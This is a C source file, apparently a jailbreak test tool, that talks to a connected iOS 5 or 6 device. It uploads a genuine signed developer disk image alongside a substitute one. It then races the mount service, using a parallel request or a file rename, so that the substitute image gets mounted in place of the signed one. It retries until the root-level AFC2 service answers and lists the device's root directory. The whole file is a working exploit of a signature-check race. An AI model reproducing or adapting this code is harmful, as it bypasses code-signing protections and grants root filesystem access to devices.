//
//  main.c
//  testjb
//
//  Created by Sam Marshall on 4/19/14.
//  Copyright (c) 2014 Sam Marshall. All rights reserved.
//

#include <CoreFoundation/CoreFoundation.h>
#include "SDMMobileDevice.h"

SDMMD_AMDeviceRef GetConnectedDevice() {
	SDMMD_AMDeviceRef device;
	
	CFArrayRef device_array = SDMMD_AMDCreateDeviceList();
	
	CFIndex count = CFArrayGetCount(device_array);
	
	if (count != 0) {
		device = (SDMMD_AMDeviceRef)CFArrayGetValueAtIndex(device_array, 0);
	}
	else {
		printf("no device\n");
	}
	
	return device;
}

static char *real_dmg, *real_dmg_signature, *ddi_dmg;

struct copy_to_paths {
	CFStringRef path_ref;
	char *path;
} ATR_PACK;

static struct copy_to_paths *use_paths;

#define ddi_real_5 "real.dmg"
#define ddi_fake_5 "ddi.dmg"

static struct copy_to_paths ddi_paths_5[2] = {
	{ CFSTR(ddi_real_5), ddi_real_5},
	{ CFSTR(ddi_fake_5), ddi_fake_5}
};

#define ddi_real_6 "PublicStaging/staging.dimage"
#define ddi_fake_6 "PublicStaging/ddi.dimage"

static struct copy_to_paths ddi_paths_6[2] = {
	{ CFSTR(ddi_real_6), ddi_real_6},
	{ CFSTR(ddi_fake_6), ddi_fake_6}
};

int main(int argc, const char * argv[]) {
	sdmmd_return_t result = 0;
	if (argc == 4) {
		real_dmg = (char *)argv[1];
		real_dmg_signature = (char *)argv[2];
		ddi_dmg = (char *)argv[3];
		
		useconds_t sleep_time = 10000;
		uint32_t retry = 0;
		
		SDMMobileDevice;
		
		SDMMD_AMDeviceRef dev = GetConnectedDevice();
		if (dev) {
			result = SDMMD_AMDeviceConnect(dev);
			CheckErrorAndReturn(result);
			
			bool can_talk = SDMMD_AMDeviceIsPaired(dev);
			if (can_talk == false) {
				result = SDMMD_AMDevicePair(dev);
				CheckErrorAndReturn(result);
			}
			
			result = SDMMD_AMDeviceStartSession(dev);
			CheckErrorAndReturn(result);
			
		Retry: {}
			SDMMD_AMConnectionRef conn = NULL;
			result = SDMMD_AMDeviceStartService(dev, CFSTR(AMSVC_AFC), NULL, &conn);
			CheckErrorAndReturn(result);
			SDMMD_AFCConnectionRef afc = SDMMD_AFCConnectionCreate(conn);
			
			SDMMD_AFCOperationRef make_dir = SDMMD_AFCOperationCreateMakeDirectory(CFSTR("PublicStaging"));
			result = SDMMD_AFCProcessOperation(afc, &make_dir);
			CheckErrorAndReturn(result);
			
			bool is_6 = SDMMD_device_os_is_at_least(dev, CFSTR("6.0"));
			
			use_paths = (is_6 ? ddi_paths_6 : ddi_paths_5);
			
			SDMMD_AFCOperationRef remove_real = SDMMD_AFCOperationCreateRemovePath(use_paths[0].path_ref);
			result = SDMMD_AFCProcessOperation(afc, &remove_real);
			CheckErrorAndReturn(result);
			
			SDMMD_AFCOperationRef remove_ddi = SDMMD_AFCOperationCreateRemovePath(use_paths[1].path_ref);
			result = SDMMD_AFCProcessOperation(afc, &remove_ddi);
			CheckErrorAndReturn(result);
			
			printf("%s -> %s\n",real_dmg,use_paths[0].path);
			result = SDMMD_AMDeviceCopyFile(NULL, NULL, NULL, afc, real_dmg, use_paths[0].path);
			CheckErrorAndReturn(result);
			printf("%s -> %s\n",ddi_dmg,use_paths[1].path);
			result = SDMMD_AMDeviceCopyFile(NULL, NULL, NULL, afc, ddi_dmg, use_paths[1].path);
			CheckErrorAndReturn(result);
			
			SDMMD_AMConnectionRef image2 = NULL;
			SDMMD_AMConnectionRef image1 = NULL;
			result = SDMMD_AMDeviceStartService(dev, CFSTR(AMSVC_MOBILE_IMAGE_MOUNT), NULL, &image1);
			CheckErrorAndReturn(result);
			
			CFMutableDictionaryRef message = SDMMD_create_dict();
			CFDictionarySetValue(message, CFSTR("Command"), CFSTR("MountImage"));
			CFDictionarySetValue(message, CFSTR("ImageType"), CFSTR("Developer"));
			
			if (!is_6) {
				result = SDMMD_AMDeviceStartService(dev, CFSTR(AMSVC_MOBILE_IMAGE_MOUNT), NULL, &image2);
				CheckErrorAndReturn(result);
			}
			
			CFStringRef real_path_set = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("/var/mobile/Media/%@"), use_paths[0].path_ref);
			CFDictionarySetValue(message, CFSTR("ImagePath"), real_path_set);
			
			CFDataRef sig_data = CFDataCreateFromFilePath(real_dmg_signature);
			
			CFDictionarySetValue(message, CFSTR("ImageSignature"), sig_data);
			result = SDMMD_ServiceSendMessage(SDMMD_TranslateConnectionToSocket(image1), message, kCFPropertyListXMLFormat_v1_0);
			CheckErrorAndReturn(result);
			
			usleep(sleep_time);
			
			if (!is_6) {
				CFDictionarySetValue(message, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/ddi.dmg"));
				result = SDMMD_ServiceSendMessage(SDMMD_TranslateConnectionToSocket(image2), message, kCFPropertyListXMLFormat_v1_0);
				CheckErrorAndReturn(result);
				
				CFDictionaryRef response2;
				result = SDMMD_ServiceReceiveMessage(SDMMD_TranslateConnectionToSocket(image2), (CFPropertyListRef*)&response2);
				CheckErrorAndReturn(result);
				printf("image2: ");
				PrintCFType(response2);
				if (CFDictionaryContainsKey(response2, CFSTR("Status"))) {
					retry+=40;
				}
			}
			else {
				SDMMD_AFCOperationRef new_path = SDMMD_AFCOperationCreateRenamePath(use_paths[1].path_ref, use_paths[0].path_ref);
				result = SDMMD_AFCProcessOperation(afc, &new_path);
				CheckErrorAndReturn(result);
				
			}
			
			CFDictionaryRef response1;
			result = SDMMD_ServiceReceiveMessage(SDMMD_TranslateConnectionToSocket(image1), (CFPropertyListRef*)&response1);
			CheckErrorAndReturn(result);
			printf("image1: ");
			PrintCFType(response1);
			
			
			SDMMD_AFCConnectionRelease(afc);
			SDMMD_AMDServiceConnectionInvalidate(conn);
			
			SDMMD_AMConnectionRef test = NULL;
			result = SDMMD_AMDeviceStartService(dev, CFSTR(AMSVC_AFC2), NULL, &test);
			if (result != kAMDSuccess) {
				retry++;
				sleep_time += 1000;
				if (retry < 40) {
					goto Retry;
				}
				CheckErrorAndReturn(result);
			}
			
			SDMMD_AFCConnectionRef root_afc = SDMMD_AFCConnectionCreate(test);
			
			SDMMD_AFCOperationRef read_dir = SDMMD_AFCOperationCreateReadDirectory(CFSTR("/"));
			result = SDMMD_AFCProcessOperation(root_afc, &read_dir);
			
			PrintCFType(read_dir->packet->response);

			
			SDMMD_AMDeviceStopSession(dev);
			SDMMD_AMDeviceDisconnect(dev);
			
		}
	}
	
	ExitLabelAndReturn(result);
}

